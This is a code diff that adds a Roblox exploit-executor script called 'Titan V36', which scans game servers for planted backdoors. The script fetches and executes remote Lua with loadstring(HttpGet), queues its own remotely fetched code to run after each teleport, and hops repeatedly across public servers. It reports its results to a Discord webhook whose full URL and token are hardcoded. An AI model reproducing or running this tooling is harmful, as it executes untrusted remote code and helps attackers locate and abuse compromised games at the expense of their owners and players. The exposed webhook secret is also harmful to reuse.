@@ -1,0 +1,454 @@
+local success_text = "No backdoored"
+local script_url = "https://raw.githubusercontent.com/jLn0n/beckdeer-skenner/main/src/main.lua"
+local self_url = "https://raw.githubusercontent.com/TonyTeardown/scripts/refs/heads/main/egrofinal1"
+local webhook_url = "https://discord.com/api/webhooks/1487289258845802576/dXwi8nw8ptZZNEfWQiVLmBmNs0uSXGOXNRAR8cV_nDlDVJtSuDumUJlYB7_SEzVKiFqx"
+
+-- [[ SYSTEM SERVICES ]] --
+local LogService = game:GetService("LogService")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local Stats = game:GetService("Stats")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local LocalPlayer = Players.LocalPlayer
+
+-- [[ STATE REGISTRY ]] --
+local found_success = false
+local scan_completed = false
+local is_minimized = false
+local databaseName = "NotSameServers.json"
+local currentJobId = tostring(game.JobId)
+local PlaceID = game.PlaceId
+local webhook = webhook_url
+local gameName = "LOADING..."
+local startTime = os.time()
+local actualHour = os.date("!*t").hour
+
+-- [[ DATA TABLES ]] --
+local AllIDs = {}
+local foundAnything = ""
+local currentSort = "Asc" 
+local reset_stage = 0
+local retry_count = 0
+
+-- [[ METADATA FETCH ]] --
+pcall(function()
+    local info = MarketplaceService:GetProductInfo(tonumber(PlaceID))
+    gameName = info.Name
+end)
+
+-- [[ UI CONSTRUCT: MAIN ]] --
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "Titan_V36_Unrolled"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = CoreGui
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.Parent = screenGui
+
+-- UNROLLED POSITIONING
+mainFrame.Size = UDim2.new(0, 380, 0, 500)
+mainFrame.Position = UDim2.new(1, -400, 1, -520)
+
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0, 10)
+mainCorner.Parent = mainFrame
+
+local mainStroke = Instance.new("UIStroke")
+mainStroke.Color = Color3.fromRGB(0, 255, 150)
+mainStroke.Thickness = 3
+mainStroke.Parent = mainFrame
+
+-- [[ UI CONSTRUCT: HEADER ]] --
+local header = Instance.new("Frame")
+header.Name = "Header"
+header.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+header.BorderSizePixel = 0
+header.Size = UDim2.new(1, 0, 0, 50)
+header.Parent = mainFrame
+
+local headerCorner = Instance.new("UICorner")
+headerCorner.CornerRadius = UDim.new(0, 10)
+headerCorner.Parent = header
+
+local title = Instance.new("TextLabel")
+title.Name = "TitleLabel"
+title.BackgroundTransparency = 1
+title.Font = Enum.Font.GothamBold
+title.TextSize = 14
+title.TextColor3 = Color3.fromRGB(0, 255, 150)
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Text = "TITAN V36 [LONG-FORM]"
+title.Size = UDim2.new(1, -60, 1, 0)
+title.Position = UDim2.new(0, 15, 0, 0)
+title.Parent = header
+
+local minBtn = Instance.new("TextButton")
+minBtn.Name = "MinimizeButton"
+minBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+minBtn.BorderSizePixel = 0
+minBtn.Font = Enum.Font.GothamBold
+minBtn.Text = "-"
+minBtn.TextColor3 = Color3.new(1, 1, 1)
+minBtn.TextSize = 18
+minBtn.Size = UDim2.new(0, 30, 0, 30)
+minBtn.Position = UDim2.new(1, -40, 0.5, -15)
+minBtn.Parent = header
+
+local minCorner = Instance.new("UICorner")
+minCorner.CornerRadius = UDim.new(0, 5)
+minCorner.Parent = minBtn
+
+-- [[ UI CONSTRUCT: CONTENT ]] --
+local content = Instance.new("Frame")
+content.Name = "ContentFrame"
+content.BackgroundTransparency = 1
+content.BorderSizePixel = 0
+content.Size = UDim2.new(1, 0, 1, -50)
+content.Position = UDim2.new(0, 0, 0, 50)
+content.Parent = mainFrame
+
+local grid = Instance.new("Frame")
+grid.Name = "StatsGrid"
+grid.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+grid.BorderSizePixel = 0
+grid.Size = UDim2.new(1, -20, 0, 160)
+grid.Position = UDim2.new(0, 10, 0, 10)
+grid.Parent = content
+
+local gridCorner = Instance.new("UICorner")
+gridCorner.CornerRadius = UDim.new(0, 8)
+gridCorner.Parent = grid
+
+-- UNROLLED LABELS
+local L1 = Instance.new("TextLabel")
+L1.Name = "JobIdLabel"
+L1.BackgroundTransparency = 1
+L1.Font = Enum.Font.Code
+L1.TextSize = 9
+L1.TextColor3 = Color3.new(0.6, 0.6, 0.6)
+L1.TextXAlignment = Enum.TextXAlignment.Left
+L1.Text = "JOB: " .. currentJobId
+L1.Size = UDim2.new(1, -20, 0, 15)
+L1.Position = UDim2.new(0, 10, 0, 10)
+L1.Parent = grid
+
+local L2 = Instance.new("TextLabel")
+L2.Name = "GameNameLabel"
+L2.BackgroundTransparency = 1
+L2.Font = Enum.Font.GothamSemibold
+L2.TextSize = 10
+L2.TextColor3 = Color3.new(0.8, 0.8, 0.8)
+L2.TextXAlignment = Enum.TextXAlignment.Left
+L2.Text = "EXP: " .. string.sub(gameName, 1, 25)
+L2.Size = UDim2.new(1, -20, 0, 20)
+L2.Position = UDim2.new(0, 10, 0, 30)
+L2.Parent = grid
+
+local L4 = Instance.new("TextLabel")
+L4.Name = "DatabaseCountLabel"
+L4.BackgroundTransparency = 1
+L4.Font = Enum.Font.GothamBold
+L4.TextSize = 11
+L4.TextColor3 = Color3.fromRGB(255, 255, 255)
+L4.TextXAlignment = Enum.TextXAlignment.Left
+L4.Text = "DB COUNT: 0"
+L4.Size = UDim2.new(0.5, -10, 0, 20)
+L4.Position = UDim2.new(0, 10, 0, 60)
+L4.Parent = grid
+
+local L6 = Instance.new("TextLabel")
+L6.Name = "SortOrderLabel"
+L6.BackgroundTransparency = 1
+L6.Font = Enum.Font.GothamBold
+L6.TextSize = 11
+L6.TextColor3 = Color3.fromRGB(0, 200, 255)
+L6.TextXAlignment = Enum.TextXAlignment.Left
+L6.Text = "SORT: ASC"
+L6.Size = UDim2.new(0.5, -10, 0, 20)
+L6.Position = UDim2.new(0.5, 0, 0, 60)
+L6.Parent = grid
+
+local LS = Instance.new("TextLabel")
+LS.Name = "StatusLabel"
+LS.BackgroundTransparency = 1
+LS.Font = Enum.Font.GothamBold
+LS.TextSize = 12
+LS.TextColor3 = Color3.fromRGB(0, 255, 150)
+LS.TextXAlignment = Enum.TextXAlignment.Center
+LS.Text = "STATUS: INITIALIZING"
+LS.Size = UDim2.new(1, -20, 0, 30)
+LS.Position = UDim2.new(0, 10, 0, 110)
+LS.Parent = grid
+
+-- [[ LOGGING SYSTEM ]] --
+local logScroll = Instance.new("ScrollingFrame")
+logScroll.Name = "LogScroll"
+logScroll.BackgroundColor3 = Color3.fromRGB(2, 2, 2)
+logScroll.BorderSizePixel = 0
+logScroll.ScrollBarThickness = 2
+logScroll.Size = UDim2.new(1, -20, 0, 180)
+logScroll.Position = UDim2.new(0, 10, 0, 180)
+logScroll.Parent = content
+
+local logLayout = Instance.new("UIListLayout")
+logLayout.SortOrder = Enum.SortOrder.LayoutOrder
+logLayout.Padding = UDim.new(0, 2)
+logLayout.Parent = logScroll
+
+-- [[ BUTTON CONSTRUCT ]] --
+local resetBtn = Instance.new("TextButton")
+resetBtn.Name = "ResetButton"
+resetBtn.BackgroundColor3 = Color3.fromRGB(150, 40, 40)
+resetBtn.BorderSizePixel = 0
+resetBtn.Font = Enum.Font.GothamBold
+resetBtn.TextColor3 = Color3.new(1, 1, 1)
+resetBtn.TextSize = 11
+resetBtn.Text = "HARD RESET DATABASE"
+resetBtn.Size = UDim2.new(1, -20, 0, 35)
+resetBtn.Position = UDim2.new(0, 10, 0, 375)
+resetBtn.Parent = content
+
+local resetCorner = Instance.new("UICorner")
+resetCorner.CornerRadius = UDim.new(0, 6)
+resetCorner.Parent = resetBtn
+
+-- [[ CORE LOGIC: MINIMIZE ]] --
+minBtn.MouseButton1Click:Connect(function()
+    if is_minimized == false then
+        is_minimized = true
+        content.Visible = false
+        mainFrame.Size = UDim2.new(0, 380, 0, 50)
+        minBtn.Text = "+"
+    else
+        is_minimized = false
+        content.Visible = true
+        mainFrame.Size = UDim2.new(0, 380, 0, 500)
+        minBtn.Text = "-"
+    end
+end)
+
+-- [[ CORE LOGIC: LOGGING ]] --
+local function AddLog(msg, col)
+    local l = Instance.new("TextLabel")
+    l.BackgroundTransparency = 1
+    l.Font = Enum.Font.Code
+    l.TextSize = 9
+    l.TextXAlignment = Enum.TextXAlignment.Left
+    l.TextColor3 = col or Color3.new(0.8, 0.8, 0.8)
+    l.Text = " > " .. tostring(msg)
+    l.Size = UDim2.new(1, 0, 0, 15)
+    l.Parent = logScroll
+    logScroll.CanvasSize = UDim2.new(0, 0, 0, logLayout.AbsoluteContentSize.Y)
+    logScroll.CanvasPosition = Vector2.new(0, logLayout.AbsoluteContentSize.Y)
+end
+
+-- [[ CORE LOGIC: DATABASE ]] --
+local function SaveToDB()
+    local success, err = pcall(function()
+        local data = HttpService:JSONEncode(AllIDs)
+        writefile(databaseName, data)
+    end)
+    L4.Text = "DB COUNT: " .. #AllIDs
+    if not success then
+        AddLog("WRITE FAIL: " .. tostring(err), Color3.new(1, 0.4, 0.4))
+    end
+end
+
+local function LoadDB()
+    local exists = pcall(function() return readfile(databaseName) end)
+    if not exists then
+        AllIDs = {actualHour}
+        SaveToDB()
+        return
+    end
+    
+    local success, result = pcall(function()
+        local content = readfile(databaseName)
+        return HttpService:JSONDecode(content)
+    end)
+    
+    if success and type(result) == "table" then
+        if result[1] ~= actualHour then
+            AllIDs = {actualHour}
+            SaveToDB()
+            AddLog("NEW HOUR: RESETTING DB", Color3.fromRGB(255, 200, 0))
+        else
+            AllIDs = result
+            AddLog("DB LOADED: " .. #AllIDs .. " ENTRIES", Color3.fromRGB(0, 200, 255))
+        end
+    else
+        AllIDs = {actualHour}
+        SaveToDB()
+    end
+    L4.Text = "DB COUNT: " .. #AllIDs
+end
+
+LoadDB()
+
+-- [[ CORE LOGIC: RESET ]] --
+resetBtn.MouseButton1Click:Connect(function()
+    if reset_stage == 0 then
+        reset_stage = 1
+        resetBtn.Text = "CONFIRM WIPE?"
+        resetBtn.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
+    else
+        reset_stage = 0
+        AllIDs = {actualHour}
+        SaveToDB()
+        resetBtn.Text = "DATABASE PURGED"
+        resetBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 100)
+        AddLog("MANUAL DB PURGE EXECUTED", Color3.new(1,1,1))
+        task.wait(1.5)
+        resetBtn.Text = "HARD RESET DATABASE"
+        resetBtn.BackgroundColor3 = Color3.fromRGB(150, 40, 40)
+    end
+end)
+
+-- [[ SCANNER INJECTION ]] --
+local obs = LogService.MessageOut:Connect(function(m)
+    local msg = m:lower()
+    local target = success_text:lower()
+    if string.find(msg, target, 1, true) then 
+        found_success = true 
+        AddLog("TARGET DETECTED!", Color3.fromRGB(0, 255, 150))
+    end
+    if string.find(msg, "complete") or string.find(msg, "finished") then 
+        scan_completed = true 
+    end
+end)
+
+AddLog("INJECTING SCANNER NODES...", Color3.new(1,1,1))
+pcall(function()
+    loadstring(game:HttpGet(script_url))()
+end)
+
+-- [[ MAIN EXECUTION LOOP ]] --
+local waitA = 0
+while waitA < 45 do
+    if found_success == true then 
+        break 
+    end
+    if scan_completed == true and waitA > 5 then 
+        break 
+    end
+    waitA = waitA + 1
+    LS.Text = "SCANNING: " .. waitA .. "s / 45s"
+    task.wait(1)
+end
+
+obs:Disconnect()
+
+-- [[ TELEPORT ENGINE ]] --
+local function TPReturner()
+    local Site;
+    local api_url = 'https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=' .. currentSort .. '&limit=100'
+    
+    if foundAnything ~= "" then 
+        api_url = api_url .. '&cursor=' .. foundAnything 
+    end
+    
+    local ok, resp = pcall(function() 
+        return game:HttpGet(api_url) 
+    end)
+    
+    if ok and resp then
+        Site = HttpService:JSONDecode(resp)
+        
+        if not Site or not Site.data or #Site.data == 0 then
+            foundAnything = ""
+            currentSort = (currentSort == "Asc" and "Desc" or "Asc")
+            L6.Text = "SORT: " .. currentSort:upper()
+            AddLog("STAGNATION: FLIPPING SORT", Color3.fromRGB(255, 150, 0))
+            return
+        end
+        
+        if Site.nextPageCursor and Site.nextPageCursor ~= "null" then
+            foundAnything = Site.nextPageCursor
+        else
+            foundAnything = ""
+            currentSort = (currentSort == "Asc" and "Desc" or "Asc")
+            L6.Text = "SORT: " .. currentSort:upper()
+        end
+        
+        for _, server in pairs(Site.data) do
+            local ID = tostring(server.id)
+            local currentCount = tonumber(server.playing)
+            local maxCount = tonumber(server.maxPlayers)
+            
+            if maxCount > currentCount and ID ~= currentJobId then
+                local isNew = true
+                for i, Existing in pairs(AllIDs) do
+                    if i > 1 and ID == tostring(Existing) then 
+                        isNew = false
+                        break 
+                    end
+                end
+                
+                if isNew == true then
+                    table.insert(AllIDs, ID)
+                    SaveToDB()
+                    AddLog("HOPPING TO NODE: .." .. string.sub(ID, -5), Color3.new(0, 1, 0))
+                    
+                    local tp_success, tp_error = pcall(function()
+                        TeleportService:TeleportToPlaceInstance(PlaceID, ID, LocalPlayer)
+                    end)
+                    
+                    if not tp_success then
+                        AddLog("TP FAIL: RETRYING...", Color3.new(1, 0, 0))
+                    end
+                    task.wait(5)
+                end
+            end
+        end
+    else
+        AddLog("API OVERLOAD: COOLING DOWN", Color3.new(1, 0, 0))
+        task.wait(10)
+    end
+end
+
+-- [[ FINAL TRIGGER ]] --
+if found_success == true then
+    LS.Text = "SUCCESS! INITIALIZING HOP"
+    LS.TextColor3 = Color3.fromRGB(0, 255, 150)
+    
+    local queue = (syn and syn.queue_on_teleport) or (queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
+    if queue then 
+        pcall(function() 
+            queue(game:HttpGet(self_url)) 
+        end) 
+    end
+    
+    while task.wait(0.5) do 
+        pcall(TPReturner) 
+    end
+else
+    LS.Text = "SCAN OVER: NO HITS"
+    LS.TextColor3 = Color3.fromRGB(255, 50, 50)
+    mainStroke.Color = Color3.fromRGB(255, 50, 50)
+    
+    pcall(function()
+        local payload = HttpService:JSONEncode({
+            ["username"] = "Titan V36",
+            ["embeds"] = {{
+                ["title"] = "🎯 SCAN REPORT",
+                ["description"] = "No backdoor matches found in this node.",
+                ["fields"] = {
+                    {["name"] = "Game", ["value"] = gameName},
+                    {["name"] = "JobId", ["value"] = currentJobId}
+                }
+            }}
+        })
+        local req = (syn and syn.request) or (http and http.request) or http_request
+        req({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload})
+    end)
+end
